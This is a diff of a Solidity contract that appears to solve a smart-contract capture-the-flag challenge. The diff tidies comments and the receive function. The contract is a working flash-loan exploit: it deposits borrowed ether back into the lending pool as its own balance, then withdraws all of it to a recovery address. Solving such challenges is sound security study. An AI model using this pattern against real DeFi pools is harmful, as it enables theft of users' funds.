@@ -74,23 +74,24 @@ contract ChallengeSolver {
         recoveryAddress = recovery;
     }
 
-    // needed to recieve eth during withdraw call
-    fallback() external payable {}
+    // needed to be able to receive eth during flashLoan and withdraw calls
+    receive() external payable {}
 
     // user calls run to initiate flashloan
     function run() public {
         lenderPool.flashLoan(ETHER_IN_POOL);
     }
 
-    // SideEntranceLenderPool flashloan function calls execute function on this contract
+    // SideEntranceLenderPool flashLoan() function calls execute() on this contract
     // we deposit the Eth back into the lender pool to get a deposited balance of 1000 Eth and pay back our flash loan
     function execute() external payable {
         lenderPool.deposit{value: ETHER_IN_POOL}();
     }
 
-    // seperatly, call withdraw which should pass since out depositewd balance is now equal to the flashloan amount and send those funds to recovery address
+    // separately, call withdraw which should pass since out deposited balance is now equal to the flash loan amount and send those funds to the recovery address
     function withdraw() public {
         lenderPool.withdraw();
-        recoveryAddress.call{value: ETHER_IN_POOL}("");
+        (bool success,) = recoveryAddress.call{value: ETHER_IN_POOL}("");
+        success;
     }
 }
